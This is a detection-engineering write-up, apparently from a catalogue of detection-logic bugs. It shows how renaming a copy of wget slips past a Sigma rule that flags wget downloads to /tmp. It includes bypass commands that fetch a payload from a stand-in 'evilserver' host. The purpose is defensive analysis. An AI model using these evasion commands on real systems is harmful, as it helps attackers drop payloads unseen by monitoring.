# ADE3-01 Example: Process Cloning - Wget Download to Tmp

**Bug Category:** ADE3-01 Context Development - Process Cloning

## Original Rule

**Source:** [Sigma - Wget Creating Files in Tmp Directory](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/file_event/file_event_lnx_wget_download_file_in_tmp_dir.yml)

**Description:** Detects use of wget to download content in a temporary directory such as "/tmp" or "/var/tmp".

**Context:** Created in response to [GobRAT malware analysis by Joseliyo Sanchez](https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/) (May 2023).

```yaml
detection:
    selection:
        Image|endswith: '/wget'
        TargetFilename|startswith:
            - '/tmp/'
            - '/var/tmp/'
    condition: selection
```

## Original GobRAT Event Log

```XML
<Event>
    <System>
        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>
        <EventID>11</EventID>
        <Channel>Linux-Sysmon/Operational</Channel>
    </System>
    <EventData>
        <Data Name="ProcessId">26571</Data>
        <Data Name="Image">/usr/bin/wget</Data>
        <Data Name="TargetFilename">/tmp/env/.qnapd/apachedtmp</Data>
    </EventData>
</Event>
```

## The Bug

**Detection relies on:** String-based process identification via `Image|endswith: '/wget'`

**Implicit assumption:** Attacker cannot clone or rename binaries

**Reality:** GobRAT runs with root-level privileges to execute loader scripts, modify `/root/.ssh/authorized_keys`, and write to `/etc/profile.d` (per [JPCERT/CC documentation](https://blogs.jpcert.or.jp/en/2023/05/gobrat.html))

## Why Process Cloning Works

**Required privileges:** Root (which GobRAT already has)

**Process cloning is trivial:**
```bash
cp /usr/bin/wget /usr/bin/foo
```

**The cloned binary:**
- ✅ Has identical functionality to wget
- ✅ Has same hash/signature
- ✅ Executes with same capabilities
- ❌ Different process name in `Image` field

## Bypass

### With Root Privileges

**Step 1: Clone the binary**
```bash
cp /usr/bin/wget /usr/bin/foo
```

**Step 2: Use cloned binary for download**
```bash
/usr/bin/foo -O /tmp/env/.evil/file "https://evilserver[.]com/path/to/payload"
```

**Result:**
- File event logs show `Image: /usr/bin/foo` (not `/usr/bin/wget`)
- Detection rule condition `Image|endswith: '/wget'` = **False**
- Download to `/tmp/` succeeds without detection

### Without Root Privileges

If attacker lacks root but has user-level access:

```bash
cp /usr/bin/wget /tmp/foo
/tmp/foo -O /tmp/evil "https://evilserver[.]com/payload"
```

## Detection Logic Analysis

**Cloning event (not flagged):**
- Process creation: `Image: /usr/bin/cp`
- File creation: `/usr/bin/foo`
- **Not in scope** yet - hasn't been used for malicious download

**Download event (should flag, but doesn't):**
- Process: `Image: /usr/bin/foo` (not `/wget`)
- File written: `/tmp/evil`
- `Image|endswith: '/wget'` = **False**
- **Result:** False Negative

## Why This Is Context Development

**Context Development:** Attacker takes an **additional preparatory step** to manipulate contextual data (process name) that the detection logic relies on.

**The attacker:**
1. Doesn't change the primary malicious action (download to /tmp)
2. Shapes the surrounding context (process name)
3. Poisons the data before the in-scope event occurs

## Evolution: Threat Intelligence vs Robust Detection

**Original purpose (2023):** Detect GobRAT-specific behavior

**Current usage (2026):** Incorporated into base Sigma rulesets as general detection

**Better approach for robust detection:**
- Monitor file creation in `/tmp/` and `/var/tmp/` directories
- Focus on behavioral indicators (network connection + file write)
- Use file metadata instead of process names

**Related malware using wget downloads:**
- [wget.sh downloader script (2025)](https://any.run/report/9274a5d4918f0cde068a11587ea2c33f08b7827f022092131c6ffe9ea198024a/ee605dcd-a508-44e1-ab6f-eb89d26797db)
- [CVE-2024-38428 wget exploitation](https://jfrog.com/blog/cve-2024-38428-wget-vuln-all-you-need-to-know/)

## Impact

**False Negative:** Malicious file download to temporary directories via cloned wget binary bypasses detection.

**Scope preservation:** The activity is still "downloading files to /tmp using wget functionality" - it's in scope, but detection logic fails.

---

**Related Documentation:**
- [ADE3 Context Development](../../docs/taxonomy/ade3-context-development.md)
- [Detection Logic Bug Theory](../../docs/theory/detection-logic-bugs.md)

**Other ADE3-01 Examples:**
- [Cat Network Activity Process Cloning](cat-network-activity.md)
- [AWS CLI Endpoint URL Process Cloning](aws-cli-endpoint.md)
